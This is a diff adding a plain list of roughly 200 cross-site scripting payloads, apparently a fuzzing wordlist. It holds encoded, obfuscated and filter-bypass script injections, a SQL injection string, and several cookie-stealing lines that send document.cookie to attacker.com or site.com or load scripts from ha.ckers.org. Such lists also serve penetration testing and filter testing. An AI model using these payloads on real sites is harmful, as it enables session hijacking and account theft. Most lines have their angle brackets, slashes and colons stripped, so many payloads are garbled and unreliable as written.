@@ -1,0 +1,200 @@
+a onclick=alert(omurugur);
+img src=x onerror=prompt(omur) 
+);scriptscriptalert(1)script
+aUdIo SrC=x OnErRoR=alert(71465)');  
+svgonload;=alert(1)
+templid=1%27%22%3E%3Cscript%3Ealert%28%27XSS%20@%20%27%2bdocument.domain%29%3C%2fscript%3E
+IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041
+IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29
+IMG SRC=jav	ascriptalert('XSS');
+IMG SRC=jav&#x09;ascriptalert('XSS');
+IMG SRC=jav&#x0A;ascriptalert('XSS');
+IMG SRC=jav&#x0D;ascriptalert('XSS');
+perl -e 'print IMG SRC=java0scriptalert(XSS);'  out
+IMG SRC= &#14;  javascriptalert('XSS');
+SCRIPTXSS SRC=httpha.ckers.orgxss.jsSCRIPT
+BODY onload!#$%&()~+-_.,;@[]^`=alert(XSS)
+SCRIPTSRC=httpha.ckers.orgxss.jsSCRIPT
+attribute='scriptbody onload&value=alert(document.cookie)
+value=A%27)%3b}%3balert(document.cookie)%3bif(0){var+html%3dwindow.opener.document.querySelector(%27[%3d
+value=%22a%27);%3Cscript%3E%3Cbody%20onload=alert(document.cookie)%3E
+uFF1C%uFE64inputautofocus onfocusb='[1].find(alert)'
+img src=x onerror=alert(document.domain)
+form action=javascriptalert(document.domain)buttonClickbuttonform
+scriptalert(1)script
+x1%01javascriptalert(document.cookie)
+a href=javascript&colon;alert&lpar;document&period;domain&rpar;Click Herea
+'scriptdocument.location='httpwww.attacker.comcgi-bincookie.cgifoo='+document.cookiescript'
+%0aalert(1);”script
+“iframe src=”testscors%23testsauditor.phpq1=imgsrc=x onerror=alert(1)”
+”scriptalert(1)
+onmouseover='prompt(1)'bad=
+--sCrIpTsCrIpTalert(1234)sCrIpT
+script src=httpsx.comscript
+svg%20onload=alert(eval(‘document’+unescape(unescape(“%252e”))%2b’domain’))
+test'()&%acxScRiPt prompt(1)ScRiPt
+()&%ScRiPt prompt(XSS)ScRiPt
+1sTYLe='acuExpreSSion(prompt(1))'bad=
+'imgsrc=''onerror='alert(atob(PDMgVHJlbGxv.source))
+' OR '1'='1' #
+onmouseover='prompt(1)'bad=
+svG onLoad=prompt(1)
+29cedscriptalert(1)script9d013=1  
+img+src=1+onerror=alert('hacı')&action=edit&comment=123
+scriptscript type=textjavascriptalert(123)script
+link href=javascriptalert(1) rel=next 
+xml version=1.0htmlhtml xmlnshtml='httpwww.w3.org1999xhtml'htmlscriptalert(document.cookie);htmlscripthtmlhtml
+a%20href=java%1B%28Jscriptalert%281%29
+video src=1 onerror=alert(1)
+audio src=1 onerror=alert(1)
+%C0%BCscript%C0%BEalert(1)%C0%BCscript%C0%BE
+svg%20xmlnsxlink=httpwww.w3.org1999xlinkacircle%20r=100%20animate%20attributeName=xlinkhref%20values=;javascriptalert(1)%20begin=0s%20dur=0.1s%20fill=freeze
+a[x0b]onmouseover=location='x6Ax61x76x61x73x63x72x69x70x74x3Ax61x6Cx65x72x74x28x30x29x3B'
+eval(aler+(!![]+[])[+[]])(xss)
+this[document][cookie]
+window[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][+[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]
+this['ale'+(!![]+[])[-~[]]+(!![]+[])[+[]]]()
+this['x64x6fx63x75x6d'+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+'kie']
+document['x63x6fx6fx6bx69x65']
+%E2%80%B9%25tag+style%3D%22xss%3Aexpression%28alert%28123%29%29%22+%E2%80%BA
+%22))}catch(e){}if(!self.a)self.a=!alert(document.cookie)
+%uff1cscript%uff1ealert(123456);%uff1cscript%uff1e
+%tag style=xssexpression(alert(123))
+%uff1cscript%uff1ealert(123456)%uff1cscript%uff1e
+123+style=behaviorurl(httpwww.biznet.com.trxss.htc)
+img src='ContentTTNetImageslogo_user.gif'onerror=javascriptalert(XSS)
+img src=1 onerror=innerHTML=location.hash and httpvictim.com#img src=1 onerror=alert(1)
+img src=sa onerror=eval(document.location.hash.substr(1))
+scriptalert('httpOnly Test '  +document.cookie)script
+rss version=2.0
+ channel
+   item
+     titleBIZNET RSS XSS TEST &lt;scriptalert(BIZNET);&lt;scripttitle
+   item
+ channel
+rss
+imgsrc='x'onerror='alert(1)'
+imgsrc=”x”onerror=”alert(1)”
+iframeimgsrc=xonerror=alert(1)
+img src= onerror=alert(1)
+imgsrconerror=alert(1)
++style=bahaviourexpression(function{}{ alert('xxs') }(this)}'
+ type=image src=dontcare.jpg onerror=alert(123)
+'%26%26'javascriptalert%25281%2529 
+httpsiteutf-7.html--+AD4-+ADw-script+AD4-alert(document.cookie)+ADw-script+AD4-
+%A2%BE%BCscript%BEalert(%A2XSS%A2)%BCscript%BE
+object data=datatexthtml;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==object
+javascript--]]%scripttitletextareanoscriptstylexmp[img=1,name=alert(1).source]img -style=aexpression&#40&#47&#42'-&#39,eval(name)%2A&#41;;width100%;height100%;positionabsolute;-ms-behaviorurl(#default#time2) name=alert(1) onerror=eval(name) src=1 autofocus onfocus=eval(name) onclick=eval(name) onmouseover=eval(name) onbegin=eval(name) background=javascripteval(name)
+0;url=javascriptalert(1) http-equiv=refresh 
+!textarea body onload='alert(1)' 
+scriptdecipher(document.forms.cipher); alert(document.forms.cipher.stream.value); document.forms.cipher.stream.value = document.forms.cipher.stream_copy.value;script 
+imgsrc=mars.pngalt=mars
+object data=javascriptalert(0)
+objectparam name=src value=javascriptalert(0)paramobject
+isindex type=image src=1 onerror=alert(1)
+isindex action=javascriptalert(1) type=image
+img src=xalert(alt) onerror=eval(src) alt=0
+xscript xmlnsx=httpwww.w3.org1999xhtmlalert('xss');xscript
+;location=location.hash)#0={};alert(0)
+alert(document.cookie)
+alert(document['cookie'])
+with(document)alert(cookie)
+a onmousemove=alert(1)
+;document.write('img sr'%2b'c=httpwww.site.comxss'%2bdocument['cookie']%2b'');
+script xalert(1)script
+%22%27%2F%3E%3Cscript%3Ealert%28'Props+To+TheRat'%29%3C%2Fscript%3E
+'});%0aalert(1);%20
+scriptString.fromCharCode(107, 51, 110, 122, 48)script
++onmouseover=window.location='httpwww.biznet.com.tr'
+%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%69%20%61%6D%20%68%65%72%65%27%29%3C%2F%73%63%72%69%70%74%3E
+ScriPtALeRt(i am here)scriPt
+%00scriptalert('XSS')script
+'scriptalert(90889)script
+%22%20onmouseover%3dalert(String.fromCharCode(88,83,83))%20par%3d%22
+%3Cbody%20onload=alert(document.cookie)%3E
+%3ciMg+SrC%3dx+OnErRoR%3dalert(51336)%3e
+img%20src%3da%20onerror%3dalert(1)
+%A2%BE%BCscript%BEalert(%A2XSS%A2)%BCscript%BE
+”alert(String.fromCharCode(88,83,83));
+ onmouseover=alert(23)
++onkeypress=alert(23)+
++onmouseover=alert(1)+
+111+onmouseover=alert(11123);
+'onfocus='alert(0x000381)'
+'onclick='alert(0x000381)'
+%uff1cscript%uff1ealert('vulnerability')%uff1cscript%uff1e
+SCRIPT SRC=httpwww.biznet.com.trturkcell_xss.jpgSCRIPT
+&lt;script&gt;&lt;script&gt;alert(&#039;xss&#039;)&lt;script&gt;&lt;script&gt;
+%00&lt;script&gt;&lt;script&gt;alert(&#039;xss&#039;)&lt;script&gt;&lt;script&gt;
+&lt;BGSOUND SRC=&quot;javascriptalert(&#039;XSS&#039;);&quot;&gt;
+&quot&gt&lt;script&gt;&lt;script&gt;alert(&#039;xss&#039;)&lt;script&gt;&lt;script&gt;
+');]{%0d%0a%00 
+'SCRIPTTITLETEXTAREA'XSS-STYLE=xssexpression(try{a=firstTime}catch(e){firstTime=1;alert(793202)})
+scriptalert('XSS')script
+scriptalert('XSS')script
+scriptalert('XSS')script
+'scriptalert('XSS')script
+'scriptalert('XSS')script
+scriptalert('XSS')script
+';}scriptscriptalert('XSS')script
+%27%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%48%65%6C%6C%6F%27%29%3C%2F%73%63%72%69%70%74%3E
+%22%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%48%65%6C%6C%6F%27%29%3C%2F%73%63%72%69%70%74%3E
+%3E%22%27%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%58%53%53%27%29%3C%2F%73%63%72%69%70%74%3E
+%2F%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%48%65%6C%6C%6F%27%29%3C%2F%73%63%72%69%70%74%3E
+%u0027%u003e%u003c%u0073%u0063%u0072%u0069%u0070%u0074%u003e%u0061%u006c%u0065%u0072%u0074%u0028%u0027%u0048%u0065%u006c%u006c%u006f%u0027%u0029%u003c%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u003e
+%u0022%u003e%u003c%u0073%u0063%u0072%u0069%u0070%u0074%u003e%u0061%u006c%u0065%u0072%u0074%u0028%u0027%u0048%u0065%u006c%u006c%u006f%u0027%u0029%u003c%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u003e
+%u003e%u0022%u0027%u003e%u003c%u0073%u0063%u0072%u0069%u0070%u0074%u003e%u0061%u006c%u0065%u0072%u0074%u0028%u0027%u0058%u0053%u0053%u0027%u0029%u003c%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u003e
+%u002f%u003e%u003c%u0073%u0063%u0072%u0069%u0070%u0074%u003e%u0061%u006c%u0065%u0072%u0074%u0028%u0027%u0048%u0065%u006c%u006c%u006f%u0027%u0029%u003c%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u003e
+%0027%003e%003cscript%003ealert%0028%0027Hello%0027%0029%003c%002fscript%003e
+%0022%003e%003cscript%003ealert%0028%0027Hello%0027%0029%003c%002fscript%003e
+%003e%0022%0027%003e%003cscript%003ealert%0028%0027XSS%0027%0029%003c%002fscript%003e
+%002f%003e%003cscript%003ealert%0028%0027Hello%0027%0029%003c%002fscript%003e
+';alert(String.fromCharCode(88,83,83))';alert(String.fromCharCode(88,83,83));alert(String.fromCharCode(88,83,83));alert(String.fromCharCode(88,83,83))--SCRIPT'SCRIPTalert(String.fromCharCode(88,83,83))SCRIPT
+'';!--XSS=&{()}
+SCRIPT SRC=httpha.ckers.orgxss.jsSCRIPT
+IMG SRC=javascriptalert('XSS');
+IMG SRC=javascriptalert('XSS')
+IMG SRC=JaVaScRiPtalert('XSS')
+IMG SRC=javascriptalert(&quot;XSS&quot;)
+IMG SRC=`javascriptalert(RSnake says, 'XSS')`
+IMG SCRIPTalert(XSS)SCRIPT
+IMG SRC=javascriptalert(String.fromCharCode(88,83,83))
+IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;
+IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041
+IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29
+IMG SRC=jav	ascriptalert('XSS');
+IMG SRC=jav&#x09;ascriptalert('XSS');
+IMG SRC=jav&#x0A;ascriptalert('XSS');
+IMG SRC=jav&#x0A;ascriptalert('XSS');
+IMG SRC=jav&#x0D;ascriptalert('XSS');
+IMG SRC=jav&#x0D;ascriptalert('XSS');
+SCR0IPTalert(XSS)SCR0IPT
+IMG SRC= &#14;  javascriptalert('XSS');
+SCRIPTXSS SRC=httpha.ckers.orgxss.jsSCRIPT
+BODY onload!#$%&()~+-_.,;@[]^`=alert(XSS)
+SCRIPTSRC=httpha.ckers.orgxss.jsSCRIPT
+SCRIPTalert(XSS);SCRIPT
+SCRIPT SRC=httpha.ckers.orgxss.jsB
+SCRIPT SRC=ha.ckers.org.j
+IMG SRC=javascriptalert('XSS')
+iframe src=httpha.ckers.orgscriptlet.html 
+SCRIPTa=XSSalert(a.source)SCRIPT
+;alert('XSS');
+TITLESCRIPTalert(XSS);SCRIPT
+INPUT TYPE=IMAGE SRC=javascriptalert('XSS');
+BODY BACKGROUND=javascriptalert('XSS')
+BODY ONLOAD=alert('XSS')
+IMG DYNSRC=javascriptalert('XSS')
+IMG LOWSRC=javascriptalert('XSS')
+BGSOUND SRC=javascriptalert('XSS');
+BR SIZE=&{alert('XSS')}
+LAYER SRC=httpha.ckers.orgscriptlet.htmlLAYER
+LINK REL=stylesheet HREF=javascriptalert('XSS');
+LINK REL=stylesheet HREF=httpha.ckers.orgxss.css
+STYLE@import'httpha.ckers.orgxss.css';STYLE
+META HTTP-EQUIV=Link Content=httpha.ckers.orgxss.css; REL=stylesheet
+STYLEBODY{-moz-bindingurl(httpha.ckers.orgxssmoz.xml#xss)}STYLE
+XSS STYLE=behavior url(xss.htc);
+STYLEli {list-style-image url(javascriptalert('XSS'));}STYLEULLIXSS
+IMG SRC='vbscriptmsgbox(XSS)'
+IMG SRC=mocha[code]
